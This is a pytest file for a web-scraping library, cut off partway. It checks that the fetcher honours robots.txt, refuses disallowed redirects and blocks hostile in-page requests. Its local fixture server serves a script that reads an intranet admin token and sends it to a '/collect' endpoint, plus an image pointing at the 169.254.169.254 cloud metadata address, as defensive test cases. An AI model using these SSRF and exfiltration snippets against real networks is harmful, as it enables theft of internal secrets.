"""The real transport stack against a local 127.0.0.1 server: robots wildcards, redirects that try to
reach disallowed pages (same host and cross host), a redirect to ftp, a redirect loop and the size cap.
No internet access; the browser variants are marked live because they need a real browser. The
browser scenarios /chain, /chainbad, /meta, /js, /jslate, /iframe and /popup are the reviewer's."""

import threading
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

import pytest

from conftest import ARTICLE_HTML
from scrapology import hostclass, provenance
from scrapology.fetch import fetch
from scrapology.session import Session

ROBOTS_A = """User-agent: *
Disallow: /private*
Disallow: /*.pdf$
Disallow: /secret
Allow: /secret-but-allowed
"""
ROBOTS_B = "User-agent: *\nDisallow: /secret\n"


class _Server:
    def __init__(self, robots: str, peer: "_Server | None" = None, host: str = "127.0.0.1") -> None:
        self.robots = robots
        self.requests: list[str] = []
        self.peer = peer
        owner = self

        class Handler(BaseHTTPRequestHandler):
            def log_message(self, *_args) -> None:
                pass

            def _send(self, status: int, body: bytes, content_type: str = "text/html; charset=utf-8", **headers):
                self.send_response(status)
                self.send_header("Content-Type", content_type)
                self.send_header("Content-Length", str(len(body)))
                for key, value in headers.items():
                    self.send_header(key.replace("_", "-"), value)
                self.end_headers()
                self.wfile.write(body)

            def do_POST(self) -> None:  # noqa: N802 (http.server API)
                owner.requests.append(f"POST {self.path}")
                self._send(200, b"ok", "text/plain")

            def do_OPTIONS(self) -> None:  # noqa: N802 (http.server API)
                owner.requests.append(f"OPTIONS {self.path}")
                self._send(403, b"", "text/plain")

            def do_GET(self) -> None:  # noqa: N802 (http.server API)
                owner.requests.append(self.path)
                path = self.path.split("?", 1)[0]
                if path == "/robots.txt":
                    self._send(200, owner.robots.encode(), "text/plain")
                elif path == "/secret":
                    self._send(200, ARTICLE_HTML.encode() + b"<p>SECRET-CONTENT-MARKER</p>")
                elif path in ("/ok", "/private-area/", "/secret-but-allowed", "/b", "/moved", "/final"):
                    self._send(200, ARTICLE_HTML.encode())
                elif path == "/allowed.js":
                    body = b"document.body.insertAdjacentHTML('beforeend', '<p>ALLOWED-SCRIPT-RAN</p>');"
                    self._send(200, body, "application/javascript")
                elif path == "/allowed-sub":
                    self._send(200, ARTICLE_HTML.encode() + b'<script src="/allowed.js"></script>')
                elif path == "/redir":
                    self._send(302, b"", Location="/secret")
                elif path == "/redir-cross" and owner.peer is not None:
                    self._send(302, b"", Location=f"{owner.peer.origin}/secret")
                elif path == "/redir-ok":
                    self._send(302, b"", Location="/allowed.js")
                elif path in ("/fetch-redir", "/fetch-redir-cross"):
                    source = "/redir" if path == "/fetch-redir" else "/redir-cross"
                    script = (
                        "<script>fetch('" + source + "').then(function(r){return r.text();}).then(function(t){"
                        "document.body.insertAdjacentHTML('beforeend', '<div id=inj>' + t + '</div>');})"
                        ".catch(function(){document.body.insertAdjacentHTML("
                        "'beforeend', '<div id=inj>fetch refused</div>');});</script>"
                    ).encode()
                    self._send(200, ARTICLE_HTML.encode() + script)
                elif path == "/img-redir":
                    self._send(200, ARTICLE_HTML.encode() + b'<img src="/redir">')
                elif path == "/img-redir-cross":
                    self._send(200, ARTICLE_HTML.encode() + b'<img src="/redir-cross">')
                elif path == "/script-redir-ok":
                    self._send(200, ARTICLE_HTML.encode() + b'<script src="/redir-ok"></script>')
                elif path == "/ws":
                    script = (
                        b"<script>try { var s = new WebSocket('ws://' + location.host + '/wsock'); "
                        b"s.onerror = function(){}; } catch (e) {}</script>"
                    )
                    self._send(200, ARTICLE_HTML.encode() + script)
                elif path == "/fetch-inject":
                    script = (
                        b"<script>fetch('/secret').then(function(r){return r.text();}).then(function(t){"
                        b"document.body.insertAdjacentHTML('beforeend', '<div id=inj>' + t + '</div>');})"
                        b".catch(function(){document.body.insertAdjacentHTML("
                        b"'beforeend', '<div id=inj>fetch refused</div>');});</script>"
                    )
                    self._send(200, ARTICLE_HTML.encode() + script)
                elif path == "/xhr":
                    script = (
                        b"<script>var x = new XMLHttpRequest(); x.open('GET', '/secret'); "
                        b"x.onload = function(){document.body.insertAdjacentHTML("
                        b"'beforeend', '<div id=inj>' + x.responseText + '</div>');}; "
                        b"x.onerror = function(){document.body.insertAdjacentHTML("
                        b"'beforeend', '<div id=inj>xhr refused</div>');}; x.send();</script>"
                    )
                    self._send(200, ARTICLE_HTML.encode() + script)
                elif path == "/prefetch":
                    self._send(200, b'<link rel="prefetch" href="/secret">' + ARTICLE_HTML.encode())
                elif path == "/img":
                    self._send(200, ARTICLE_HTML.encode() + b'<img src="/secret">')
                elif path == "/third-party" and owner.peer is not None:
                    tag = f'<img src="{owner.peer.origin}/secret">'.encode()
                    self._send(200, ARTICLE_HTML.encode() + tag)
                elif path == "/blob":
                    script = (
                        b"<script>var b = new Blob(['<h1>blob page</h1>'], {type: 'text/html'}); "
                        b"location.href = URL.createObjectURL(b);</script>"
                    )
                    self._send(200, ARTICLE_HTML.encode() + script)
                elif path == "/chain":
                    self._send(302, b"", Location="/x")
                elif path == "/x":
                    self._send(302, b"", Location="/final")
                elif path == "/chainbad":
                    self._send(302, b"", Location="/x2")
                elif path == "/x2":
                    self._send(302, b"", Location="/secret")
                elif path == "/meta":
                    body = b'<meta http-equiv="refresh" content="0;url=/secret">' + ARTICLE_HTML.encode()
                    self._send(200, body)
                elif path == "/js":
                    self._send(200, ARTICLE_HTML.encode() + b"<script>location.href='/secret';</script>")
                elif path == "/jslate":
                    script = b"<script>setTimeout(function(){location.href='/secret';}, 200);</script>"
                    self._send(200, ARTICLE_HTML.encode() + script)
                elif path == "/iframe":
                    self._send(200, ARTICLE_HTML.encode() + b'<iframe src="/secret"></iframe>')
                elif path == "/iframe-ok":
                    self._send(200, ARTICLE_HTML.encode() + b'<iframe src="/ok"></iframe>')
                elif path == "/popup":
                    self._send(200, ARTICLE_HTML.encode() + b"<script>window.open('/secret');</script>")
                elif path == "/x/file.pdf":
                    self._send(200, b"%PDF-1.4 fake", "application/pdf")
                elif path == "/open":
                    self._send(302, b"", Location="/secret")
                elif path == "/open-ok":
                    self._send(302, b"", Location="/moved")
                elif path == "/a":
                    self._send(302, b"", Location="/b")
                elif path == "/cross" and owner.peer is not None:
                    self._send(302, b"", Location=f"{owner.peer.origin}/secret")
                elif path == "/to-ftp":
                    self._send(302, b"", Location="ftp://files.test/pub/x")
                elif path == "/loop":
                    self._send(302, b"", Location="/loop")
                elif path == "/big":
                    self._send(200, b"<html><body>" + b"x" * 200000 + b"</body></html>")
                elif path == "/evil":
                    intranet = getattr(owner, "intranet_origin", "")
                    script = (
                        "<script>fetch('" + intranet + "/admin').then(function(r){return r.text();})"
                        ".then(function(t){document.body.insertAdjacentHTML("
                        "'beforeend', '<div id=inj>' + t + '</div>');"
                        "return fetch('/collect?d=' + encodeURIComponent(t));})"
                        ".catch(function(){document.body.insertAdjacentHTML("
                        "'beforeend', '<div id=inj>fetch refused</div>');});</script>"
                    ).encode()
                    self._send(200, ARTICLE_HTML.encode() + script)
                elif path == "/evil-img":
                    intranet = getattr(owner, "intranet_origin", "")
                    tag = ('<img src="' + intranet + '/admin.png">').encode()
                    self._send(200, ARTICLE_HTML.encode() + tag)
                elif path == "/xfetch" and owner.peer is not None:
                    script = ("<script>fetch('" + owner.peer.origin + "/data').catch(function(){});</script>").encode()
                    self._send(200, ARTICLE_HTML.encode() + script)
                elif path == "/fetch-ok":
                    script = (
                        b"<script>fetch('/allowed.txt').then(function(r){return r.text();}).then(function(){"
                        b"document.body.insertAdjacentHTML('beforeend', '<div id=inj>SAME-ORIGIN-FETCH-OK</div>');})"
                        b".catch(function(){});</script>"
                    )
                    self._send(200, ARTICLE_HTML.encode() + script)
                elif path == "/ximg" and owner.peer is not None:
                    tag = ('<img src="' + owner.peer.origin + '/pic">').encode()
                    self._send(200, ARTICLE_HTML.encode() + tag)
                elif path == "/xscript" and owner.peer is not None:
                    tag = ('<script src="' + owner.peer.origin + '/allowed.js"></script>').encode()
                    self._send(200, ARTICLE_HTML.encode() + tag)
                elif path == "/post-fetch":
                    script = (
                        b"<script>fetch('/post-target', {method: 'POST', body: 'a=1'})"
                        b".catch(function(){});</script>"
                    )
                    self._send(200, ARTICLE_HTML.encode() + script)
                elif path == "/form-post":
                    body = (
                        b'<form id="f" method="post" action="/formpost"><input name="q" value="1"></form>'
                        b"<script>document.getElementById('f').submit();</script>"
                    )
                    self._send(200, ARTICLE_HTML.encode() + body)
                elif path == "/form-get-secret":
                    body = (
                        b'<form id="f" method="get" action="/secret"></form>'
                        b"<script>document.getElementById('f').submit();</script>"
                    )
                    self._send(200, ARTICLE_HTML.encode() + body)
                elif path == "/form-get-ok":
                    body = (
                        b'<form id="f" method="get" action="/ok"><input name="q" value="1"></form>'
                        b"<script>document.getElementById('f').submit();</script>"
                    )
                    self._send(200, ARTICLE_HTML.encode() + body)
                elif path == "/metadata":
                    tag = b'<img src="http://169.254.169.254/latest/meta-data/">'
                    self._send(200, ARTICLE_HTML.encode() + tag)
                elif path == "/admin":
                    self._send(200, b"INTRANET-ADMIN-TOKEN-42", "text/plain")
                elif path == "/admin.png":
                    self._send(200, b"\x89PNG-fake-admin", "image/png")
                elif path == "/data":
                    self._send(200, b"DATA-PAYLOAD", "text/plain")
                elif path == "/allowed.txt":
                    self._send(200, b"allowed text", "text/plain")
                elif path == "/pic":
                    self._send(200, b"\x89PNG-fake-pic", "image/png")
                elif path == "/module.js":
                    body = b"document.body.insertAdjacentHTML('beforeend', '<p>MODULE-RAN</p>');"
                    self._send(200, body, "application/javascript")
                elif path == "/module-x.js":
                    body = b"document.body.insertAdjacentHTML('beforeend', '<p>MODULE-X-RAN</p>');"
                    self._send(200, body, "application/javascript")
                elif path == "/font.woff2":
                    self._send(200, b"\x00\x01\x00\x00fake-woff2-font", "font/woff2")
                elif path == "/preload.json":
                    self._send(200, b'{"secret":"PRELOAD-BODY"}', "application/json")
                elif path == "/sandbox-frame":
                    body = (
                        b"<html><body><script>fetch('/frame-data').then(function(r){return r.text();})"
                        b".then(function(t){parent.postMessage(t, '*');});</script></body></html>"
                    )
                    self._send(200, body)
                elif path == "/frame-data":
                    self._send(200, b"FRAME-DATA-BODY", "text/plain")
                elif path == "/module-same":
                    tag = b'<script type="module" src="/module.js"></script>'
                    self._send(200, ARTICLE_HTML.encode() + tag)
                elif path == "/module-cross" and owner.peer is not None:
                    tag = ('<script type="module" src="' + owner.peer.origin + '/module-x.js"></script>').encode()
                    self._send(200, ARTICLE_HTML.encode() + tag)
                elif path == "/font-same":
                    tag = b"<style>@font-face{font-family:F;src:url('/font.woff2')} body{font-family:F}</style>"
                    self._send(200, ARTICLE_HTML.encode() + tag)
                elif path == "/font-cross" and owner.peer is not None:
                    tag = (
                        "<style>@font-face{font-family:F;src:url('"
                        + owner.peer.origin
                        + "/font.woff2')} body{font-family:F}</style>"
                    ).encode()
                    self._send(200, ARTICLE_HTML.encode() + tag)
                elif path == "/preload-same":
                    tag = b'<link rel="preload" as="fetch" href="/preload.json">'
                    self._send(200, ARTICLE_HTML.encode() + tag)
                elif path == "/preload-cross" and owner.peer is not None:
                    tag = (
                        '<link rel="preload" as="fetch" href="' + owner.peer.origin + '/preload.json" crossorigin>'
                    ).encode()
                    self._send(200, ARTICLE_HTML.encode() + tag)
                elif path == "/img-crossorigin" and owner.peer is not None:
                    tag = ('<img src="' + owner.peer.origin + '/pic" crossorigin="anonymous">').encode()
                    self._send(200, ARTICLE_HTML.encode() + tag)
                elif path == "/script-crossorigin" and owner.peer is not None:
                    tag = (
                        '<script src="' + owner.peer.origin + '/allowed.js" crossorigin="anonymous"></script>'
                    ).encode()
                    self._send(200, ARTICLE_HTML.encode() + tag)
                elif path == "/sandboxed-fetch":
                    body = (
                        b'<iframe sandbox="allow-scripts" src="/sandbox-frame"></iframe>'
                        b"<script>window.addEventListener('message', function(e){"
                        b"document.body.insertAdjacentHTML('beforeend', '<p>' + e.data + '</p>');});</script>"
                    )
                    self._send(200, ARTICLE_HTML.encode() + body)
                elif path == "/plain-frame-fetch":
                    body = (
                        b'<iframe src="/sandbox-frame"></iframe>'
                        b"<script>window.addEventListener('message', function(e){"
                        b"document.body.insertAdjacentHTML('beforeend', '<p>' + e.data + '</p>');});</script>"
                    )
                    self._send(200, ARTICLE_HTML.encode() + body)
                else:
                    self._send(404, b"<html><body>gone</body></html>")

        self.httpd = ThreadingHTTPServer((host, 0), Handler)
        self.origin = f"http://{host}:{self.httpd.server_address[1]}"
        self.thread = threading.Thread(target=self.httpd.serve_forever, daemon=True)
        self.thread.start()

    def stop(self) -> None:
        self.httpd.shutdown()
        self.httpd.server_close()


@pytest.fixture
def servers():
    b = _Server(ROBOTS_B)
    a = _Server(ROBOTS_A, peer=b)
    yield a, b
    a.stop()
    b.stop()


@pytest.fixture
def public_and_intranet(monkeypatch: pytest.MonkeyPatch):
    """A page on a simulated public address (127.0.0.2, real loopback but classified as public for the
    test) reaching a real intranet service (127.0.0.1). Skips if the machine cannot bind 127.0.0.2."""
    intranet = _Server(ROBOTS_B)
    try:
        evil = _Server(ROBOTS_A, peer=intranet, host="127.0.0.2")
    except OSError as err:
        intranet.stop()
        pytest.skip(f"cannot bind 127.0.0.2 on this machine: {err}")
    evil.intranet_origin = intranet.origin
    real_classify_host = hostclass.classify_host
    monkeypatch.setattr(
        hostclass, "classify_host", lambda h: "public" if h == "127.0.0.2" else real_classify_host(h)
    )
    yield evil, intranet
    evil.stop()
    intranet.stop()


def test_allowed_page_is_fetched_over_the_real_stack(servers, tmp_path) -> None:
    a, _ = servers
    result = fetch(f"{a.origin}/ok", out_dir=str(tmp_path), session=Session(delay=0), engine="http")
    assert result.outcome == "fetched", result.note
    assert a.requests == ["/robots.txt", "/ok"]


def test_wildcard_and_dollar_rules_block_before_the_request(servers, tmp_path) -> None:
    a, _ = servers
    session = Session(delay=0)
    result = fetch(f"{a.origin}/private-area/", out_dir=str(tmp_path), session=session, engine="http")
    assert result.outcome == "blocked" and "robots.txt" in result.note
    result = fetch(f"{a.origin}/x/file.pdf", out_dir=str(tmp_path), session=session, engine="http")
    assert result.outcome == "blocked"
    result = fetch(f"{a.origin}/secret-but-allowed", out_dir=str(tmp_path), session=session, engine="http")
    assert result.outcome == "fetched"
    assert "/private-area/" not in a.requests and "/x/file.pdf" not in a.requests
    assert a.requests == ["/robots.txt", "/secret-but-allowed"]


def test_same_host_redirect_to_disallowed_page_is_blocked(servers, tmp_path) -> None:
    a, _ = servers
    result = fetch(f"{a.origin}/open", out_dir=str(tmp_path), session=Session(delay=0), engine="http")
    assert result.outcome == "blocked" and result.exit_code == 3
    assert "refused" in result.note and result.final_url == f"{a.origin}/secret"
    assert "/secret" not in a.requests and a.requests == ["/robots.txt", "/open"]
    assert result.files == {}
    (record,) = provenance.read_records(str(tmp_path))
    assert record["outcome"] == "blocked" and record["files"] == {}


def test_cross_host_redirect_checks_the_other_hosts_robots(servers, tmp_path) -> None:
    a, b = servers
    result = fetch(f"{a.origin}/cross", out_dir=str(tmp_path), session=Session(delay=0), engine="http")
    assert result.outcome == "blocked" and "refused" in result.note
    assert a.requests == ["/robots.txt", "/cross"]
    assert b.requests == ["/robots.txt"]


def test_allowed_redirect_is_followed_and_recorded(servers, tmp_path) -> None:
    a, _ = servers
    result = fetch(f"{a.origin}/open-ok", out_dir=str(tmp_path), session=Session(delay=0), engine="http")
    assert result.outcome == "fetched" and result.final_url == f"{a.origin}/moved"
    assert result.redirects == [f"{a.origin}/open-ok"]
    (record,) = provenance.read_records(str(tmp_path))
    assert record["redirects"] == [f"{a.origin}/open-ok"] and record["final_url"] == f"{a.origin}/moved"


def test_redirect_to_ftp_is_not_followed(servers, tmp_path) -> None:
    a, _ = servers
    result = fetch(f"{a.origin}/to-ftp", out_dir=str(tmp_path), session=Session(delay=0), engine="http")
    assert result.outcome == "failed" and "ftp" in result.note


def test_redirect_loop_stops_after_five_hops(servers, tmp_path) -> None:
    a, _ = servers
    result = fetch(f"{a.origin}/loop", out_dir=str(tmp_path), session=Session(delay=0), engine="http")
    assert result.outcome == "failed" and "redirects" in result.note
    assert a.requests.count("/loop") == 6


def test_size_cap_over_the_real_stack(servers, tmp_path) -> None:
    a, _ = servers
    result = fetch(f"{a.origin}/big", out_dir=str(tmp_path), session=Session(delay=0), engine="http", max_bytes=50000)
    assert result.outcome == "failed" and "50000 byte limit" in result.note and result.files == {}
    result = fetch(f"{a.origin}/big", out_dir=str(tmp_path), session=Session(delay=0), engine="http")
    assert result.outcome == "fetched"


def test_per_host_delay_holds_between_page_requests(servers, tmp_path) -> None:
    a, _ = servers
    session = Session(delay=0.6)
    started = time.monotonic()
    fetch(f"{a.origin}/ok", out_dir=str(tmp_path), session=session, engine="http")
    fetch(f"{a.origin}/secret-but-allowed", out_dir=str(tmp_path), session=session, engine="http")
    # robots.txt, /ok and /secret-but-allowed are three requests to one host: at least two delays
    assert time.monotonic() - started >= 1.1


# ---------- browser engine, needs a real Chromium, Chrome or Edge ----------


@pytest.mark.live
def test_browser_redirect_to_disallowed_page_is_aborted(servers, tmp_path) -> None:
    a, _ = servers
    result = fetch(f"{a.origin}/open", out_dir=str(tmp_path), session=Session(delay=0), engine="browser")
    assert result.outcome == "blocked", result.note
    assert "refused" in result.note and result.files == {}
    assert "/secret" not in a.requests


@pytest.mark.live
def test_browser_cross_host_redirect_is_aborted(servers, tmp_path) -> None:
    a, b = servers
    result = fetch(f"{a.origin}/cross", out_dir=str(tmp_path), session=Session(delay=0), engine="browser")
    assert result.outcome == "blocked", result.note
    assert "/secret" not in b.requests


@pytest.mark.live
def test_browser_navigations_are_throttled_and_recorded(servers, tmp_path) -> None:
    a, _ = servers
    started = time.monotonic()
    result = fetch(f"{a.origin}/a", out_dir=str(tmp_path), session=Session(delay=1.0), engine="browser")
    elapsed = time.monotonic() - started
    assert result.outcome == "fetched", result.note
    assert result.final_url == f"{a.origin}/b" and result.redirects == [f"{a.origin}/a"]
    assert "rendered" in result.files and "raw" not in result.files
    # robots.txt at t0, the first navigation waits one delay, the redirect hop waits another
    assert elapsed >= 1.9, elapsed


def _browser_fetch(server: _Server, path: str, tmp_path, delay: float = 0) -> object:
    return fetch(f"{server.origin}{path}", out_dir=str(tmp_path), session=Session(delay=delay), engine="browser")


@pytest.mark.live
def test_browser_allowed_chain_is_followed_and_recorded(servers, tmp_path) -> None:
    a, _ = servers
    result = _browser_fetch(a, "/chain", tmp_path)
    assert result.outcome == "fetched", result.note
    assert result.final_url == f"{a.origin}/final"
    assert result.redirects == [f"{a.origin}/chain", f"{a.origin}/x"]
    # the interceptor reads /chain, /x and /final; the browser then loads /final: one request more than a browser alone
    assert a.requests == ["/robots.txt", "/chain", "/x", "/final", "/final"]


@pytest.mark.live
def test_browser_chain_ending_on_a_disallowed_page_is_blocked(servers, tmp_path) -> None:
    a, _ = servers
    result = _browser_fetch(a, "/chainbad", tmp_path)
    assert result.outcome == "blocked", result.note
    assert "refused" in result.note and result.files == {}
    assert "/secret" not in a.requests and a.requests == ["/robots.txt", "/chainbad", "/x2"]


@pytest.mark.live
@pytest.mark.parametrize("path", ["/meta", "/js", "/jslate"])
def test_browser_client_side_navigation_to_disallowed_page_keeps_the_loaded_page(servers, tmp_path, path):
    a, _ = servers
    result = _browser_fetch(a, path, tmp_path)
    assert result.outcome == "fetched", result.note
    assert result.final_url == f"{a.origin}{path}"
    assert result.warning and "/secret" in result.warning and "refused" in result.warning
    assert "A real article" in open(result.files["rendered"], encoding="utf-8").read()
    assert "/secret" not in a.requests


@pytest.mark.live
def test_browser_iframe_to_disallowed_page_is_refused(servers, tmp_path) -> None:
    a, _ = servers
    result = _browser_fetch(a, "/iframe", tmp_path)
    assert result.outcome == "fetched", result.note
    assert result.warning and "/secret" in result.warning
    assert "/secret" not in a.requests


@pytest.mark.live
def test_browser_iframe_to_allowed_page_is_loaded_and_throttled(servers, tmp_path) -> None:
    a, _ = servers
    started = time.monotonic()
    result = _browser_fetch(a, "/iframe-ok", tmp_path, delay=0.8)
    assert result.outcome == "fetched", result.note
    assert result.warning is None
    assert a.requests.count("/ok") >= 1
    # robots.txt, then /iframe-ok after one delay, then the iframe's /ok after another
    assert time.monotonic() - started >= 1.5


@pytest.mark.live
def test_browser_popup_is_never_followed(servers, tmp_path) -> None:
    a, _ = servers
    result = _browser_fetch(a, "/popup", tmp_path)
    assert result.outcome == "fetched", result.note
    assert result.warning and "popups are not followed" in result.warning
    assert "/secret" not in a.requests


@pytest.mark.live
def test_browser_size_cap_applies_before_the_page_reaches_the_browser(servers, tmp_path) -> None:
    a, _ = servers
    result = fetch(
        f"{a.origin}/big", out_dir=str(tmp_path), session=Session(delay=0), engine="browser", max_bytes=50000
    )
    assert result.outcome == "failed" and "50000 byte limit" in result.note and result.files == {}


def _rendered(result) -> str:
    return open(result.files["rendered"], encoding="utf-8").read()


@pytest.mark.live
@pytest.mark.parametrize("path", ["/fetch-inject", "/xhr", "/img"])
def test_browser_page_requests_to_disallowed_paths_are_refused(servers, tmp_path, path) -> None:
    a, _ = servers
    result = _browser_fetch(a, path, tmp_path)
    assert result.outcome == "fetched", result.note
    assert "/secret" not in a.requests, a.requests
    html = _rendered(result)
    assert "A real article" in html and "SECRET-CONTENT-MARKER" not in html
    assert result.warning and "/secret" in result.warning and "refused" in result.warning


@pytest.mark.live
def test_browser_prefetch_of_a_disallowed_path_is_refused(servers, tmp_path) -> None:
    a, _ = servers
    result = _browser_fetch(a, "/prefetch", tmp_path)
    assert result.outcome == "fetched", result.note
    assert "/secret" not in a.requests, a.requests
    assert "SECRET-CONTENT-MARKER" not in _rendered(result)


@pytest.mark.live
def test_browser_third_party_subresource_obeys_that_hosts_robots(servers, tmp_path) -> None:
    a, b = servers
    result = _browser_fetch(a, "/third-party", tmp_path)
    assert result.outcome == "fetched", result.note
    assert a.requests == ["/robots.txt", "/third-party"]
    assert b.requests == ["/robots.txt"], b.requests  # one robots.txt, never /secret
    assert result.warning and f"{b.origin}/secret" in result.warning


@pytest.mark.live
def test_browser_allowed_subresource_still_loads(servers, tmp_path) -> None:
    a, _ = servers
    result = _browser_fetch(a, "/allowed-sub", tmp_path)
    assert result.outcome == "fetched", result.note
    assert "/allowed.js" in a.requests
    assert "ALLOWED-SCRIPT-RAN" in _rendered(result)
    assert result.warning is None


@pytest.mark.live
def test_browser_blob_navigation_keeps_the_committed_page(servers, tmp_path) -> None:
    a, _ = servers
    result = _browser_fetch(a, "/blob", tmp_path)
    assert result.outcome == "fetched", result.note
    assert result.final_url == f"{a.origin}/blob"
    assert result.warning and "blob" in result.warning and "refused" in result.warning
    assert "A real article" in _rendered(result)


@pytest.mark.live
@pytest.mark.parametrize("path", ["/fetch-redir", "/img-redir"])
def test_browser_subresource_redirect_to_disallowed_path_is_refused(servers, tmp_path, path) -> None:
    a, _ = servers
    result = _browser_fetch(a, path, tmp_path)
    assert result.outcome == "fetched", result.note
    assert "/secret" not in a.requests, a.requests
    assert "/redir" in a.requests  # the first hop was allowed and fetched by the interceptor
    html = _rendered(result)
    assert "A real article" in html and "SECRET-CONTENT-MARKER" not in html
    assert result.warning and "/secret" in result.warning and "refused" in result.warning


@pytest.mark.live
def test_browser_subresource_img_cross_host_redirect_obeys_that_hosts_robots(servers, tmp_path) -> None:
    """An <img> is not cors-mode, so a cross-host redirect it follows is not refused for being
    cross-origin; it still obeys the target host's robots.txt, as before round 6."""
    a, b = servers
    result = _browser_fetch(a, "/img-redir-cross", tmp_path)
    assert result.outcome == "fetched", result.note
    assert "/secret" not in a.requests and "/secret" not in b.requests
    assert b.requests == ["/robots.txt"], b.requests
    assert "SECRET-CONTENT-MARKER" not in _rendered(result)
    assert result.warning and f"{b.origin}/secret" in result.warning


@pytest.mark.live
def test_browser_subresource_fetch_redirect_cross_origin_is_refused(servers, tmp_path) -> None:
    """A same-origin fetch() whose redirect chain lands on another origin is refused at that hop
    (E1, round 6): the interceptor fetches the hop itself, so without this check the target host's
    robots.txt would be consulted and the body replayed to the page as if the fetch had stayed
    same-origin, which is exactly the browser cross-origin check this closes."""
    a, b = servers
    result = _browser_fetch(a, "/fetch-redir-cross", tmp_path)
    assert result.outcome == "fetched", result.note
    assert "/secret" not in a.requests and "/secret" not in b.requests
    assert b.requests == [], b.requests  # refused before b's robots.txt is ever requested
    assert "SECRET-CONTENT-MARKER" not in _rendered(result)
    assert result.warning and "cross-origin script request" in result.warning


@pytest.mark.live
def test_browser_allowed_subresource_redirect_chain_still_loads(servers, tmp_path) -> None:
    a, _ = servers
    result = _browser_fetch(a, "/script-redir-ok", tmp_path)
    assert result.outcome == "fetched", result.note
    assert "/redir-ok" in a.requests and "/allowed.js" in a.requests
    assert "ALLOWED-SCRIPT-RAN" in _rendered(result)
    assert result.warning is None


@pytest.mark.live
def test_browser_websockets_are_refused(servers, tmp_path) -> None:
    a, _ = servers
    result = _browser_fetch(a, "/ws", tmp_path)
    assert result.outcome == "fetched", result.note
    assert "/wsock" not in a.requests, a.requests
    assert result.warning and "WebSocket" in result.warning and "/wsock" in result.warning


# ---------- round 6 (E1): the interceptor must not bypass the browser's cross-origin protections ----------


@pytest.mark.live
def test_browser_page_cannot_read_an_intranet_service_through_a_fetch(public_and_intranet, tmp_path) -> None:
    """A page on a simulated public address fetches a real intranet service's /admin and tries to
    exfiltrate it to /collect. Neither the admin token nor the exfiltration request may appear."""
    evil, intranet = public_and_intranet
    result = _browser_fetch(evil, "/evil", tmp_path)
    assert result.outcome == "fetched", result.note
    assert "INTRANET-ADMIN-TOKEN-42" not in _rendered(result)
    assert not any("/collect" in r for r in evil.requests), evil.requests
    assert intranet.requests == [], intranet.requests  # not even a robots.txt request reached it
    assert result.warning and intranet.origin in result.warning


@pytest.mark.live
def test_browser_img_to_an_intranet_service_is_refused_as_private_network(public_and_intranet, tmp_path) -> None:
    evil, intranet = public_and_intranet
    result = _browser_fetch(evil, "/evil-img", tmp_path)
    assert result.outcome == "fetched", result.note
    assert intranet.requests == [], intranet.requests
    assert result.warning and "private network" in result.warning and intranet.origin in result.warning


@pytest.mark.live
def test_browser_cloud_metadata_address_is_refused_from_a_public_page(public_and_intranet, tmp_path) -> None:
    evil, _intranet = public_and_intranet
    result = _browser_fetch(evil, "/metadata", tmp_path)
    assert result.outcome == "fetched", result.note
    assert result.warning and "private network" in result.warning and "169.254.169.254" in result.warning


@pytest.mark.live
def test_browser_cross_origin_fetch_is_refused_even_when_the_target_would_allow_it(servers, tmp_path) -> None:
    a, b = servers
    result = _browser_fetch(a, "/xfetch", tmp_path)
    assert result.outcome == "fetched", result.note
    assert "/data" not in b.requests, b.requests
    assert result.warning and "cross-origin script request" in result.warning
    assert f"{b.origin}/data" in result.warning


@pytest.mark.live
def test_browser_same_origin_fetch_still_works(servers, tmp_path) -> None:
    a, _ = servers
    result = _browser_fetch(a, "/fetch-ok", tmp_path)
    assert result.outcome == "fetched", result.note
    assert "SAME-ORIGIN-FETCH-OK" in _rendered(result)
    assert "/allowed.txt" in a.requests
    assert result.warning is None


@pytest.mark.live
def test_browser_cross_origin_image_still_loads(servers, tmp_path) -> None:
    """<img> is not fetch/xhr/eventsource, so the resource_type fallback leaves it no-cors: a
    cross-host image is not refused for being cross-origin, only checked against robots.txt."""
    a, b = servers
    result = _browser_fetch(a, "/ximg", tmp_path)
    assert result.outcome == "fetched", result.note
    assert "/pic" in b.requests
    assert result.warning is None


@pytest.mark.live
def test_browser_cross_origin_classic_script_still_loads(servers, tmp_path) -> None:
    a, b = servers
    result = _browser_fetch(a, "/xscript", tmp_path)
    assert result.outcome == "fetched", result.note
    assert "ALLOWED-SCRIPT-RAN" in _rendered(result)
    assert "/allowed.js" in b.requests
    assert result.warning is None


@pytest.mark.live
def test_browser_post_fetch_is_refused_by_the_method_rule(servers, tmp_path) -> None:
    a, _ = servers
    result = _browser_fetch(a, "/post-fetch", tmp_path)
    assert result.outcome == "fetched", result.note
    assert "POST /post-target" not in a.requests, a.requests
    assert result.warning and "method" in result.warning


@pytest.mark.live
def test_browser_form_post_auto_submit_is_refused_by_the_method_rule(servers, tmp_path) -> None:
    a, _ = servers
    result = _browser_fetch(a, "/form-post", tmp_path)
    assert result.outcome == "fetched", result.note
    assert result.final_url == f"{a.origin}/form-post"  # 204 to the refused navigation keeps the loaded page
    assert "POST /formpost" not in a.requests, a.requests
    assert result.warning and "/formpost" in result.warning and "method" in result.warning


@pytest.mark.live
def test_browser_form_get_auto_submit_to_a_disallowed_page_is_refused(servers, tmp_path) -> None:
    a, _ = servers
    result = _browser_fetch(a, "/form-get-secret", tmp_path)
    assert result.outcome == "fetched", result.note
    assert result.final_url == f"{a.origin}/form-get-secret"
    assert "/secret" not in a.requests, a.requests
    assert result.warning and "/secret" in result.warning


@pytest.mark.live
def test_browser_form_get_auto_submit_to_an_allowed_page_navigates(servers, tmp_path) -> None:
    a, _ = servers
    result = _browser_fetch(a, "/form-get-ok", tmp_path)
    assert result.outcome == "fetched", result.note
    assert result.final_url == f"{a.origin}/ok?q=1"
    assert "/ok?q=1" in a.requests


# ---------- round 7: module scripts, fonts and preloads are cors-mode too; a sandboxed frame's origin is opaque


@pytest.mark.live
def test_browser_same_origin_module_script_still_loads(servers, tmp_path) -> None:
    a, _ = servers
    result = _browser_fetch(a, "/module-same", tmp_path)
    assert result.outcome == "fetched", result.note
    assert "/module.js" in a.requests
    assert "MODULE-RAN" in _rendered(result)
    assert result.warning is None


@pytest.mark.live
def test_browser_cross_origin_module_script_is_refused(servers, tmp_path) -> None:
    a, b = servers
    result = _browser_fetch(a, "/module-cross", tmp_path)
    assert result.outcome == "fetched", result.note
    assert "/module-x.js" not in b.requests, b.requests
    assert "MODULE-X-RAN" not in _rendered(result)
    assert result.warning and "cross-origin script request" in result.warning
    assert f"{b.origin}/module-x.js" in result.warning


@pytest.mark.live
